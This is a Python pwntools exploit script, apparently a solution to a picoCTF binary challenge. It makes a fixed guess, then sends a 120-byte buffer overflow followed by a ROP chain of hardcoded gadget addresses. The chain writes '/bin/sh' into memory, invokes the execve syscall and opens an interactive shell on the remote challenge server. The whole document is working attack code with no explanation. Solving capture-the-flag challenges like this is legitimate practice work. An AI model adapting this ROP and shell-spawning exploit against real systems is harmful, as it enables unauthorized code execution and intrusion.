from pwn import *

def convert_str_to_end(value):
    result ='0x'
    for i in range(len(value) - 1, -1, -1):
        result += hex(ord(value[i])).replace('0x', '')
    return int(result, 16)

def exploit(boolean):
    if boolean:
        r = remote('jupiter.challenges.picoctf.org', 51462)
    else:
        r = process('./vuln')
    
    guessing = b'84'
    r.recvuntil('guess?\n')
    r.sendline(guessing)
    print(r.recv().decode())

    bin_sh = convert_str_to_end('/bin/sh')
    mov_rdi_rsi = 0x447d7b                  # mov qword ptr [rdi], rsi ; ret
    store_address = 0x6bcdef
    pop_rax = 0x4163f4
    pop_rdi = 0x400696
    pop_rdx = 0x44cc26
    pop_rsi = 0x410ca3
    syscall_addr = 0x40137c
    
    payload = b'A'*120
    payload += p64(pop_rdi)
    payload += p64(store_address)
    payload += p64(pop_rsi)
    payload += p64(bin_sh)
    payload += p64(mov_rdi_rsi)
    
    payload += p64(pop_rax)
    payload += p64(0x3b)
    payload += p64(pop_rdi)
    payload += p64(store_address)
    payload += p64(pop_rdx)
    payload += p64(0x0)
    payload += p64(pop_rsi)
    payload += p64(0x0)
    payload += p64(syscall_addr)

    r.recvuntil('\nName? ')
    r.sendline(payload)
    r.interactive()

exploit(True)